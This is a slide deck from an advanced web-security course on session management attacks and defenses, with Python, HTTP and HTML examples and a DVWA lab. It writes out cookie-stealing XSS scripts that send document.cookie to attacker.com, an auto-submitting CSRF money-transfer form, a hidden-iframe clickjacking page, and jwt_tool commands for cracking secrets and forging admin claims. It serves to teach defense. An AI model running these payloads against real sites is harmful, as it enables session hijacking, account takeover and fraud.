---
tags:
  - security:security
  - security:web-security
  - security:penetration-testing
  - security:owasp
level: advanced
category: security
audience:
  - audiences:developers
  - audiences:security-professionals
---

# Session Management Attacks

## Hijacking and Manipulating User Sessions

---

## How Sessions Work

![how_sessions_work](svg/courses/security/web-application-hacking/10_session_attacks/how_sessions_work.svg)

---

## Session Token Generation

```python
# VULNERABLE: Predictable session tokens
import hashlib
import time

def generate_session_bad():
    # Sequential counter
    return str(counter)                    # 1, 2, 3...

    # Timestamp-based
    return str(int(time.time()))           # 1705276800

    # MD5 of username
    return hashlib.md5(username.encode()).hexdigest()

# SECURE: Cryptographically random tokens
import secrets

def generate_session_good():
    return secrets.token_urlsafe(32)       # 43 chars of randomness
    # Example: "dGhpcyBpcyBhIHNlY3VyZSB0b2tlbg..."
    # 256 bits of entropy - practically unguessable
```

---

## Session Hijacking Techniques

![session_hijacking_techniques](svg/courses/security/web-application-hacking/10_session_attacks/session_hijacking_techniques.svg)

---

## Session Hijacking via XSS

```javascript
// Attacker injects this via XSS vulnerability:

// Method 1: Redirect with cookie
<script>
document.location = 'https://attacker.com/steal?c='
    + document.cookie;
</script>

// Method 2: Hidden image request
<script>
new Image().src = 'https://attacker.com/steal?c='
    + document.cookie;
</script>

// Method 3: Fetch API (stealthier)
<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
});
</script>

// Defense: HttpOnly flag prevents JavaScript access to cookies
```

---

## Session Fixation Attack

```misc
Attack flow:
1. Attacker gets a valid session ID from the server
   GET /login -> Set-Cookie: session=ATTACKER_SESSION

2. Attacker tricks victim into using this session
   <a href="https://target.com/login?session=ATTACKER_SESSION">
   Click here for a special offer</a>

3. Victim logs in with the attacker's session ID
   POST /login (Cookie: session=ATTACKER_SESSION)

4. Server authenticates victim on the SAME session
   The session is now authenticated

5. Attacker uses the session they already know
   GET /dashboard (Cookie: session=ATTACKER_SESSION)
   -> Attacker is now logged in as the victim!
```

---

## Session Fixation Prevention

```python
# VULNERABLE: Session ID not regenerated on login
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'],
                       request.form['password'])
    if user:
        session['user_id'] = user.id  # Same session ID!
        return redirect('/dashboard')

# SECURE: Regenerate session on login
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'],
                       request.form['password'])
    if user:
        # Destroy old session, create new one
        session.clear()
        session.regenerate()  # New session ID
        session['user_id'] = user.id
        return redirect('/dashboard')
```

---

## CSRF (Cross-Site Request Forgery)

```html
<!-- Attacker's website (evil.com) -->
<!-- Victim visits this page while logged into target.com -->

<!-- Method 1: Hidden form auto-submit -->
<form action="https://target.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Method 2: Image tag (GET-based CSRF) -->
<img src="https://target.com/transfer?to=attacker&amount=10000">

<!-- The victim's browser automatically includes
     the session cookie for target.com! -->
```

---

## CSRF Prevention

```python
# Method 1: CSRF tokens (synchronizer pattern)
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# In template:
<form method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- form fields -->
</form>

# Method 2: SameSite cookie attribute
Set-Cookie: session=abc123; SameSite=Strict
# Strict: Never sent cross-site
# Lax: Sent on top-level GET navigations only
# None: Always sent (requires Secure flag)

# Method 3: Double-submit cookie
# Set CSRF token in both cookie AND form field
# Server verifies they match
```

---

## Session Token Analysis with Burp Sequencer

```misc
Steps to analyze session token quality:

1. In Burp, capture a request that returns a session token
2. Right-click -> Send to Sequencer
3. Configure the token location (cookie value)
4. Click "Start live capture"
5. Collect at least 10,000 tokens
6. Click "Analyze now"

Sequencer reports:
- Overall quality estimate
- Character-level analysis
- Bit-level analysis
- FIPS 140-2 compliance tests

Good tokens: "Excellent" quality, pass all tests
Bad tokens: Patterns detected, predictable bits
```

---

## Cookie Security Flags

```http
# Maximum security cookie configuration
Set-Cookie: session=abc123;
    Path=/;
    Domain=target.com;
    Secure;              # HTTPS only
    HttpOnly;            # No JavaScript access
    SameSite=Strict;     # No cross-site sending
    Max-Age=1800;        # 30 min expiry
    __Host-              # Cookie prefix (extra security)

# Cookie prefixes (modern browsers):
# __Secure- : Must have Secure flag
# __Host-   : Must have Secure, Path=/, no Domain
```

---

## Session Timeout Strategies

```python
# Idle timeout: Session expires after inactivity
IDLE_TIMEOUT = 30 * 60  # 30 minutes

# Absolute timeout: Session expires regardless of activity
ABSOLUTE_TIMEOUT = 8 * 60 * 60  # 8 hours

@app.before_request
def check_session_timeout():
    if 'user_id' in session:
        now = time.time()
        last_active = session.get('last_active', now)
        created = session.get('created', now)

        # Check idle timeout
        if now - last_active > IDLE_TIMEOUT:
            session.clear()
            return redirect('/login?reason=idle')

        # Check absolute timeout
        if now - created > ABSOLUTE_TIMEOUT:
            session.clear()
            return redirect('/login?reason=expired')

        session['last_active'] = now
```

---

## Secure Logout Implementation

```python
@app.route('/logout', methods=['POST'])  # POST, not GET!
def logout():
    # 1. Get session ID before clearing
    session_id = session.get('session_id')

    # 2. Remove session from server-side store
    if session_id:
        session_store.delete(session_id)

    # 3. Clear all session data
    session.clear()

    # 4. Invalidate the session cookie
    response = redirect('/login')
    response.set_cookie('session', '',
        expires=0,
        httponly=True,
        secure=True)

    # 5. (Optional) Add to token blacklist for JWT
    return response

# Note: Use POST to prevent CSRF-based logout
```

---

## JWT Session Security

```python
# Common JWT mistakes and fixes

# Mistake 1: Storing JWT in localStorage
# Fix: Use HttpOnly cookie

# Mistake 2: No token expiration
# Fix: Short-lived access tokens (15 min) + refresh tokens

# Mistake 3: No token revocation
# Fix: Token blacklist or short expiry + refresh rotation

# Mistake 4: Sensitive data in payload
# JWT payload is Base64-encoded, NOT encrypted!
# Never include: passwords, SSNs, credit cards

# Mistake 5: Weak signing secret
# Fix: Use RS256 with proper key management
# Or HS256 with 256+ bit random secret

import jwt
token = jwt.encode(
    {'user_id': 123, 'exp': datetime.utcnow() + timedelta(minutes=15)},
    SECRET_KEY, algorithm='HS256'
)
```

---

## Session Puzzling / Session Variable Overloading

```python
# Session puzzling occurs when multiple functions
# share the same session variable name

# Password reset flow sets session['user']
@app.route('/reset-password')
def reset_password():
    email = request.form['email']
    user = User.query.filter_by(email=email).first()
    session['user'] = user.username  # Stores username
    send_reset_email(user)
    return "Reset email sent"

# Authentication check uses session['user']
@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect('/login')
    # User is "authenticated" via session['user']
    return render_template('dashboard.html', user=session['user'])

# Attack: Submit password reset for admin -> session['user'] = 'admin'
# Navigate to /dashboard -> Authenticated as admin!

# Defense: Use different session keys for different purposes
# session['authenticated_user'] vs session['reset_user']
```

---

## Session Storage Comparison

![session_storage_comparison](svg/courses/security/web-application-hacking/10_session_attacks/session_storage_comparison.svg)

---

## Clickjacking Protection

```html
<!-- Clickjacking: Attacker overlays invisible iframe -->
<!-- Victim thinks they're clicking their page -->
<!-- Actually clicking on target.com in hidden iframe -->

<!-- Attacker's page: -->
<style>
  iframe {
    opacity: 0;       /* Invisible */
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 999;     /* On top */
  }
</style>
<iframe src="https://target.com/delete-account"></iframe>
<button>Click here to win a prize!</button>
<!-- User clicks "prize" button but actually clicks
     the delete-account button in the hidden iframe -->

<!-- Defense 1: X-Frame-Options header -->
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN

<!-- Defense 2: CSP frame-ancestors -->
Content-Security-Policy: frame-ancestors 'none'

<!-- Defense 3: JavaScript frame-buster (fallback) -->
<script>if (top !== self) top.location = self.location;</script>
```

---

## JSON Web Token (JWT) Attack Toolkit

```bash
# jwt_tool - Swiss army knife for JWT testing

# Decode a JWT
python3 jwt_tool.py eyJhbGciOiJI...

# Test for known vulnerabilities
python3 jwt_tool.py eyJhbGciOiJI... -M at
# Tests: none algorithm, algorithm confusion, key confusion

# Tamper with claims
python3 jwt_tool.py eyJhbGciOiJI... -T
# Interactive mode to modify header/payload

# Brute-force the secret
python3 jwt_tool.py eyJhbGciOiJI... -C -d wordlist.txt

# Sign with known secret
python3 jwt_tool.py eyJhbGciOiJI... -S hs256 -p "secret_key"

# Common JWT claims to modify:
# "role": "user" -> "role": "admin"
# "sub": "123" -> "sub": "1"  (admin user)
# "exp": past -> "exp": far_future
# "iss": "" (empty issuer)
```

---

## Cookie Tossing Attack

```misc
Cookie Tossing: Set cookies from a subdomain
that override the parent domain's cookies

Attack scenario:
1. Attacker controls: evil.sub.target.com
2. Sets cookie: session=attacker_value; Domain=target.com
3. Victim visits target.com
4. Browser sends attacker's cookie
5. Victim uses attacker's session (session fixation)

Or:
1. Attacker controls: evil.sub.target.com
2. Sets cookie: csrf_token=known_value; Domain=target.com
3. Attacker can now predict victim's CSRF token
4. Perform CSRF attack with the known token

Defense:
- Use __Host- cookie prefix (prevents domain attribute)
- Validate cookies server-side
- Regenerate tokens after authentication
- Monitor for unexpected cookie sources
```

---

## Lab: Session Analysis

**Tasks**:

1. Log in to DVWA, capture session cookie
1. Analyze the `PHPSESSID` format
1. Test if session changes on login/logout
1. Check for `HttpOnly` and `Secure` flags
1. Test session fixation (set your own session ID)
1. Use Burp Sequencer to analyze token randomness

```bash
# Check cookie flags
curl -v http://localhost:8080/login.php 2>&1 | grep -i set-cookie
```

---

## Summary

- Session tokens must be cryptographically random
- Use `HttpOnly`, `Secure`, and `SameSite` cookie flags
- Regenerate session ID on authentication state changes
- Implement both idle and absolute session timeouts
- `CSRF` tokens prevent cross-site request forgery
- Proper logout must destroy server-side session data
- `JWT` tokens need short expiry and proper validation

> Next: SQL Injection Basics
